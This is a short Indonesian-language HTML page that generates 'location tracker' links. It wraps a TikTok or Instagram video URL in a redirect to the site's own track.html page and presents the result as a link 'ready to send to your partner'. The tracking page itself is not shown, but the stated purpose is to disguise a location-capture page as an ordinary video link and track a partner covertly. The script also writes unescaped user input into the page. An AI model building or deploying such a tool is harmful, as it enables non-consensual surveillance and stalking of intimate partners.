<!DOCTYPE html>
<html>
<head>
  <title>Generator Link Pelacak Lokasi</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      max-width: 600px;
      margin: auto;
      background: #f9f9f9;
    }
    input, button {
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      font-size: 16px;
    }
    button {
      background: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #45a049;
    }
    a {
      word-break: break-all;
      color: #007bff;
    }
  </style>
</head>
<body>
  <h2>ðŸ”— Generator Link Pelacak Lokasi</h2>
  <p>Masukkan link video TikTok atau Instagram yang ingin kamu kirim:</p>
  <input type="text" id="inputLink" placeholder="https://www.tiktok.com/@user/video/..." />
  <button onclick="generate()">ðŸŽ¯ Buat Link Pelacak</button>

  <p id="outputLink" style="margin-top:20px; font-weight: bold;"></p>

  <script>
    function generate() {
      const originalUrl = document.getElementById("inputLink").value.trim();
      if (!originalUrl) {
        alert("Masukkan link videonya dulu!");
        return;
      }

      const encodedUrl = encodeURIComponent(originalUrl);
      const domain = window.location.origin;
      const trackingUrl = `${domain}/track.html?redirect=${encodedUrl}`;

      document.getElementById("outputLink").innerHTML =
        `Link siap dikirim ke pasangan kamu: <br><a href="${trackingUrl}" target="_blank">${trackingUrl}</a>`;
    }
  </script>
</body>
</html>
